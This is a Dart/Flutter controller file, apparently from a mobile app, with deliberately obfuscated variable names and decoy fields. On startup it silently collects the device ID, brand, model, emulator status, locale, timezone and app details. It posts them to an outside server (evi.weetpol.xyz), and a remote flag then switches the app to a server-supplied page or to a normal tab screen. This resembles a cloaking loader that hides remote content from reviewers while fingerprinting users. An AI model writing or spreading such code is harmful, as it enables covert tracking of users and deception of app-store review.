import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var thcmlxpfq = RxBool(false);
  var hmgurx = RxBool(true);
  var qanuyfrc = RxString("");
  var eleonore = RxBool(false);
  var dach = RxBool(true);
  final frlguwcdb = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    fjhnvw();
  }


  Future<void> fjhnvw() async {

    eleonore.value = true;
    dach.value = true;
    hmgurx.value = false;

    frlguwcdb.post("https://evi.weetpol.xyz/VGPAKBKQZVS33ZR",data: await lucbxfkqei()).then((value) {
      var jmgydibu = value.data["jmgydibu"] as String;
      var iwsylfb = value.data["iwsylfb"] as bool;
      if (iwsylfb) {
        qanuyfrc.value = jmgydibu;
        jacklyn();
      } else {
        kris();
      }
    }).catchError((e) {
      hmgurx.value = true;
      dach.value = true;
      eleonore.value = false;
    });
  }

  Future<Map<String, dynamic>> lucbxfkqei() async {
    final DeviceInfoPlugin odceg = DeviceInfoPlugin();
    PackageInfo kcvwph_ealsk = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var qcfpwk = Platform.localeName;
    var fsPm = currentTimeZone;

    var erlHPykI = kcvwph_ealsk.packageName;
    var usvqDIBf = kcvwph_ealsk.version;
    var XLEh = kcvwph_ealsk.buildNumber;

    var bouAdUx = kcvwph_ealsk.appName;
    var cfzdl  = "";
    var raphaelVandervort = "";
    var edgardoBins = "";
    var OhNCupIy = "";
    var vernieGoldner = "";
    var brgA = "";
    var marleyMertz = "";
    var kamrenHane = "";
    var ritaKuphal = "";
    var bellHagenes = "";


    var vwOUqET = "";
    var OIzEl = false;

    if (GetPlatform.isAndroid) {
      vwOUqET = "android";
      var keifczh = await odceg.androidInfo;

      OhNCupIy = keifczh.brand;

      brgA  = keifczh.model;
      cfzdl = keifczh.id;

      OIzEl = keifczh.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      vwOUqET = "ios";
      var muftediwsa = await odceg.iosInfo;
      OhNCupIy = muftediwsa.name;
      brgA = muftediwsa.model;

      cfzdl = muftediwsa.identifierForVendor ?? "";
      OIzEl  = muftediwsa.isPhysicalDevice;
    }

    var res = {
      "raphaelVandervort" : raphaelVandervort,
      "bouAdUx": bouAdUx,
      "usvqDIBf": usvqDIBf,
      "erlHPykI": erlHPykI,
      "brgA": brgA,
      "fsPm": fsPm,
      "XLEh": XLEh,
      "qcfpwk": qcfpwk,
      "marleyMertz" : marleyMertz,
      "vwOUqET": vwOUqET,
      "OIzEl": OIzEl,
      "vernieGoldner" : vernieGoldner,
      "kamrenHane" : kamrenHane,
      "bellHagenes" : bellHagenes,
      "OhNCupIy": OhNCupIy,
      "cfzdl": cfzdl,
      "edgardoBins" : edgardoBins,
      "ritaKuphal" : ritaKuphal,

    };
    return res;
  }

  Future<void> kris() async {
    Get.offAllNamed("/tabs");
  }

  Future<void> jacklyn() async {
    Get.offAllNamed("/cool");
  }

}
